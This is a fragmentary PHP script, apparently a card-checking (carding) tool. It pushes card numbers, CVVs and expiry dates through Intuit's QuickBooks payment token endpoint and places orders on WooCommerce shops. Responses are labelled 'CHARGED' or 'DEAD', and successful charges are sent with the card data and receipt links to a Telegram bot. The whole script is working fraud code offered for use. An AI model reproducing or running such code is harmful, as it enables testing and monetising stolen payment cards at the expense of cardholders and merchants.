...
$token = ''.$una1.'-'.$dalawa2.'-'.$tatlo3.'-'.$apat4.'-'.$lima5.'';
...
$paymentMethods = [
    ...
    'acceptblue-cc' => '/<input[^>]*name="payment_method"[^>]*value="acceptblue-cc"/'
    ];
...
$ch = curl_init();
 curl_setopt($ch, CURLOPT_URL, 'https://api.intuit.com/quickbooks/v4/payments/tokens');
 curl_setopt($ch, CURLOPT_USERAGENT, $_SERVER['HTTP_USER_AGENT']);
 curl_setopt($ch, CURLOPT_HEADER, 0);
 curl_setopt($ch, CURLOPT_ENCODING, 'gzip, deflate');
 curl_setopt($ch, CURLOPT_HTTPHEADER, array(
  'authority: api.intuit.com',
  'origin: https://'.$hostname.'',
  'refer: https://'.$hostname.'',
...
# [ 𝙋𝙊𝙎𝙏𝙁𝙄𝙀𝙇𝘿𝙎 ]    
 curl_setopt($ch, CURLOPT_POSTFIELDS, '{"card":{"expYear":"'.$ano.'","expMonth":"'.$mes1.'","name":"'.$fname.'","cvc":"'.$cvv.'","number":"'.$cc.'","address":{"postalCode":"'.$zip.'","streetAddress":"'.$street.'","country":"'.$country.'","city":"'.$state.'","region":"'.$state.'"}}}');
...
curl_setopt($ch, CURLOPT_POSTFIELDS, http_build_query([
    ...
    'shipping_city' => '',
    'shipping_state' => '',
    'wc-intuit-payments-credit-card-expiry' => $mes1 . ' / ' . $ano,
    'wc-intuit-payments-credit-card-js-token' => $token,
    'payment_method' => "intuit_payments_credit_card",
    'wc-intuit-payments-credit-card-last-four' => $cc4,
    'wc-intuit-payments-credit-card-card-type' => $ctype,
...
if ($isoCountry !== 'Not found') {
 ...
 if (strpos($Payment, '"result":"success","redirect"') !== false && strpos($Payment, 'order-received') !== false) { 
    ...
    <span style="color: #15b823ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
      ...
      $telegramMessage = "[#CHARGED]- $lista [CVV CHARGED INTUIT CREDIT-CC]
    \n[$hostname1]
    \n[$receiptUrl]\n";
    sendToTelegram($telegramMessage, $telegramToken, $chatId);
    
} elseif (strpos($msg, 'An error occurred, please try again or try an alternate form of payment.') !== false) {
    echo '<span style="color: #ffffffff; padding: 8px;"> #DEAD [PLEASE TRY ALTERNATE FORM OF PAYMENT][AMOUNT:'.$price1.'] ['.$ip.'] <a href="' . $hostname1 . '" target="_blank">SITE</a>'.$lineNumber.'<br>
    <span style="color: #ff09b5ff; padding: 8px;"> INFO: '.$cardBrand.'-'.$cardtype.'-'.$cardlevel.' | '.$issuerName.' | '.$isoCountry.' <br><br>';
